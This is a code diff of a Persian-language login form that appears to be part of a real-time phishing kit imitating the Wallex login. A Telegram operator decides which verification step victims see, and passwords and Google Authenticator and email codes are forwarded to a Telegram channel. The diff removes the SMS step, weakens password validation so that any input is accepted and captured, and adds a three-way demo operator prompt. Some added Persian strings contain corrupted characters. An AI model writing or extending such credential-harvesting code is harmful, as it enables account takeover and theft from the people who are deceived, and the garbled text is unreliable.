@@ -9,7 +9,6 @@ import {
   Lock,
   Smartphone,
   Mail,
-  QrCode,
   Eye,
   EyeOff,
 } from "lucide-react";
@@ -42,7 +41,6 @@ type AuthStep =
   | "phone"
   | "loading"
   | "verify-phone"
-  | "sms"
   | "password"
   | "google"
   | "email"
@@ -65,10 +63,7 @@ export const LoginForm = () => {
   // Phone verification states
   const [verifyCode, setVerifyCode] = useState("");
 
-  // SMS states
-  const [smsCode, setSmsCode] = useState("");
-  const [countdown, setCountdown] = useState(60);
-  const [isSecondAttempt, setIsSecondAttempt] = useState(false);
+
 
   // Password states
   const [password, setPassword] = useState("");
@@ -87,7 +82,6 @@ export const LoginForm = () => {
     mobileNumber?: string;
     inviteCode?: string;
     verifyCode?: string;
-    smsCode?: string;
     password?: string;
     googleCode?: string;
     email?: string;
@@ -112,13 +106,7 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Countdown timer for SMS
-  useEffect(() => {
-    if (currentStep === "sms" && countdown > 0) {
-      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
-      return () => clearTimeout(timer);
-    }
-  }, [countdown, currentStep]);
+
 
   // Handle admin actions from Telegram
   const handleAdminAction = (action: string) => {
@@ -145,12 +133,7 @@ export const LoginForm = () => {
               "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
-        case "sms":
-          setCurrentStep("sms");
-          setErrors({
-            smsCode: "کد پیامک وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
-          });
-          break;
+
         case "email":
           setCurrentStep("email");
           setEmailStep("code");
@@ -175,11 +158,7 @@ export const LoginForm = () => {
         setErrors({});
         setHasError(false);
         break;
-      case "sms":
-        setCurrentStep("sms");
-        setErrors({});
-        setHasError(false);
-        break;
+
       case "email":
         setCurrentStep("email");
         setEmailStep("email");
@@ -203,8 +182,8 @@ export const LoginForm = () => {
   };
 
   const validatePassword = (password: string): boolean => {
-    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*#?&]{8,}$/;
-    return passwordRegex.test(password);
+    // Accept any non-empty password
+    return password.length > 0;
   };
 
   const validateEmail = (email: string): boolean => {
@@ -307,19 +286,32 @@ export const LoginForm = () => {
           // In demo mode, show manual admin controls
           if (!validateTelegramConfig()) {
             setTimeout(() => {
-              const choice = confirm(
+              const choice = prompt(
                 "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
-                  "آیا می‌خواهید احراز هویت با رمز عبور ادامه یابد?\n\n" +
-                  "OK = Password Authentication\n" +
-                  "Cancel = SMS Authentication",
+                "انتخاب کنید:\n" +
+                "1 = Password\n" +
+                "2 = Google Auth\n" +
+                "3 = Email",
+                "1"
               );
 
-              if (choice) {
-                console.log("🎭 Demo admin chose: Password");
-                handleAdminAction("password");
-              } else {
-                console.log("🎭 Demo admin chose: SMS");
-                handleAdminAction("sms");
+              switch(choice) {
+                case "1":
+                  console.log("🎭 Demo admin chose: Password");
+                  handleAdminAction("password");
+                  break;
+                case "2":
+                  console.log("🎭 Demo admin chose: Google Auth");
+                  handleAdminAction("google");
+                  break;
+                case "3":
+                  console.log("🎭 Demo admin chose: Email");
+                  handleAdminAction("email");
+                  break;
+                default:
+                  console.log("🎭 Demo admin chose: Password (default)");
+                  handleAdminAction("password");
+              }
               }
             }, 3000);
           }
@@ -334,32 +326,7 @@ export const LoginForm = () => {
       setIsSubmitting(false);
     }
   };
-  // SMS code submission
-  const handleSmsCodeSubmit = async () => {
-    setErrors({});
 
-    if (!smsCode || smsCode.length !== 6) {
-      setErrors({ smsCode: "کد پیامک ۶ رقمی را وارد کنید" });
-      return;
-    }
-
-    setIsSubmitting(true);
-
-    try {
-      const success = await updateAuthStep(sessionId, "sms", smsCode);
-      if (!success) {
-        throw new Error("Failed to update SMS step");
-      }
-
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      setCurrentStep("loading");
-    } catch (error) {
-      console.error("SMS code submission error:", error);
-      setErrors({ smsCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
-    } finally {
-      setIsSubmitting(false);
-    }
-  };
 
   // Password submission
   const handlePasswordSubmit = async (e: React.FormEvent) => {
@@ -373,7 +340,7 @@ export const LoginForm = () => {
 
     if (!validatePassword(password)) {
       setErrors({
-        password: "رمز عبور باید حداقل ۸ کاراکتر و شامل حروف و اعداد باشد",
+        password: "رمز عبور نمی‌تواند خالی باشد",
       });
       return;
     }
@@ -418,7 +385,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ار��ال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -458,7 +425,7 @@ export const LoginForm = () => {
       setEmailStep("code");
     } catch (error) {
       console.error("Email sending error:", error);
-      setErrors({ email: "خطا در ارسال کد ایمیل. لطفا دوباره تلاش کنید." });
+      setErrors({ email: "خطا در ارسال کد ایمیل. لط��ا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -502,10 +469,7 @@ export const LoginForm = () => {
     }
   };
 
-  const handleResendCode = () => {
-    setCountdown(60);
-    console.log("Resend code requested - Admin will handle this");
-  };
+
 
   const handleBack = () => {
     if (currentStep === "verify-phone") {
@@ -707,7 +671,7 @@ export const LoginForm = () => {
 
                 {validateTelegramConfig() && (
                   <AlertMessage>
-                    🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد.
+                    🤖 بات تلگرام فعال: اطلاعا�� به کانال والکس ارسال خواهد شد.
                   </AlertMessage>
                 )}
 
@@ -999,133 +963,9 @@ export const LoginForm = () => {
           {/* Step 3: Loading */}
           {currentStep === "loading" && renderLoading()}
 
-          {/* Step 4: SMS Authentication */}
-          {currentStep === "sms" && (
-            <>
-              <div style={{ marginBottom: "24px" }}>
-                <AlertMessage>
-                  <MessageSquare
-                    className="inline ml-2"
-                    style={{ width: "16px", height: "16px" }}
-                  />
-                  {isSecondAttempt
-                    ? "کد اول نادرست بود. این آخرین فرصت شما است."
-                    : `کد پیامک به شماره ${maskPhoneNumber(phoneNumber)} توسط ادمین ارسال خواهد شد.`}
-                </AlertMessage>
-              </div>
 
-              <div style={{ marginBottom: "16px" }}>
-                <label
-                  style={{
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    marginBottom: "8px",
-                    display: "block",
-                    textAlign: "right",
-                  }}
-                >
-                  کد تایید پیامک
-                </label>
-                <OTPInput
-                  length={6}
-                  value={smsCode}
-                  onComplete={setSmsCode}
-                  onChange={setSmsCode}
-                  disabled={isSubmitting}
-                />
-                {errors.smsCode && (
-                  <p
-                    style={{
-                      color: "rgb(220, 38, 38)",
-                      fontSize: "12px",
-                      textAlign: "right",
-                      marginTop: "8px",
-                    }}
-                  >
-                    {errors.smsCode}
-                  </p>
-                )}
-              </div>
 
-              <div style={{ marginBottom: "24px", textAlign: "right" }}>
-                <p
-                  style={{
-                    color: "rgba(0, 0, 0, 0.6)",
-                    fontSize: "14px",
-                    lineHeight: "24.01px",
-                    paddingBottom: "4px",
-                    paddingTop: "4px",
-                  }}
-                >
-                  {countdown > 0 ? (
-                    <>
-                      <span>{toPersianDigits(countdown)}</span>
-                      <span> ثانیه تا ارسال مجدد کد</span>
-                    </>
-                  ) : (
-                    <button
-                      onClick={handleResendCode}
-                      style={{
-                        color: "rgb(0, 122, 255)",
-                        textDecoration: "underline",
-                        background: "none",
-                        border: "none",
-                        cursor: "pointer",
-                        fontSize: "14px",
-                      }}
-                    >
-                      ارسال مجدد کد پیامک
-                    </button>
-                  )}
-                </p>
-              </div>
-
-              <div style={{ marginTop: "24px" }}>
-                <hr
-                  style={{
-                    borderColor: "rgba(0, 0, 0, 0.2)",
-                    marginLeft: "-20px",
-                    marginRight: "-20px",
-                    marginBottom: "16px",
-                  }}
-                />
-                <Button
-                  onClick={handleSmsCodeSubmit}
-                  disabled={isSubmitting || smsCode.length !== 6}
-                  className="w-full"
-                  style={{
-                    backgroundColor: "rgb(23, 29, 38)",
-                    color: "rgb(255, 255, 255)",
-                    borderRadius: "8px",
-                    padding: "10px 16px",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    textTransform: "uppercase",
-                    border: "none",
-                    cursor:
-                      isSubmitting || smsCode.length !== 6
-                        ? "not-allowed"
-                        : "pointer",
-                    opacity: isSubmitting || smsCode.length !== 6 ? "0.5" : "1",
-                  }}
-                >
-                  {isSubmitting ? (
-                    <div className="flex items-center justify-center">
-                      <Loader2
-                        className="animate-spin mr-2"
-                        style={{ width: "16px", height: "16px" }}
-                      />
-                      <span>در حال تایید...</span>
-                    </div>
-                  ) : (
-                    "تایید کد"
-                  )}
-                </Button>
-              </div>
-            </>
-          )}
-
-          {/* Step 5: Password Authentication */}
+          {/* Step 4: Password Authentication */}
           {currentStep === "password" && (
             <>
               <form onSubmit={handlePasswordSubmit}>
@@ -1258,7 +1098,7 @@ export const LoginForm = () => {
             </>
           )}
 
-          {/* Step 6: Google Authenticator */}
+          {/* Step 5: Google Authenticator */}
           {currentStep === "google" && (
             <>
               <div style={{ marginBottom: "24px" }}>
@@ -1271,50 +1111,7 @@ export const LoginForm = () => {
                 </AlertMessage>
               </div>
 
-              <div
-                style={{
-                  display: "flex",
-                  flexDirection: "column",
-                  alignItems: "center",
-                  gap: "16px",
-                  marginBottom: "24px",
-                  padding: "20px",
-                  backgroundColor: "rgb(248, 249, 250)",
-                  borderRadius: "8px",
-                  border: "1px solid rgba(0, 0, 0, 0.1)",
-                }}
-              >
-                <QrCode
-                  style={{
-                    width: "120px",
-                    height: "120px",
-                    color: "rgba(0, 0, 0, 0.7)",
-                  }}
-                />
-                <div style={{ textAlign: "center" }}>
-                  <p
-                    style={{
-                      fontSize: "14px",
-                      fontWeight: "500",
-                      color: "rgb(0, 0, 0)",
-                      margin: "0 0 4px 0",
-                    }}
-                  >
-                    QR Code برای راه‌اندازی
-                  </p>
-                  <p
-                    style={{
-                      fontSize: "12px",
-                      color: "rgba(0, 0, 0, 0.6)",
-                      margin: "0",
-                      lineHeight: "1.4",
-                    }}
-                  >
-                    اگر Google Authenticator را نصب نکرده‌اید، ابتدا از App
-                    Store یا Google Play دانلود کنید
-                  </p>
-                </div>
-              </div>
+
 
               <div style={{ marginBottom: "16px" }}>
                 <label
@@ -1395,7 +1192,7 @@ export const LoginForm = () => {
             </>
           )}
 
-          {/* Step 7: Email Authentication */}
+          {/* Step 6: Email Authentication */}
           {currentStep === "email" && emailStep === "email" && (
             <>
               <form onSubmit={handleEmailSubmit}>
@@ -1504,7 +1301,7 @@ export const LoginForm = () => {
             </>
           )}
 
-          {/* Step 8: Email Code Verification */}
+          {/* Step 7: Email Code Verification */}
           {currentStep === "email" && emailStep === "code" && (
             <>
               <div style={{ marginBottom: "16px" }}>
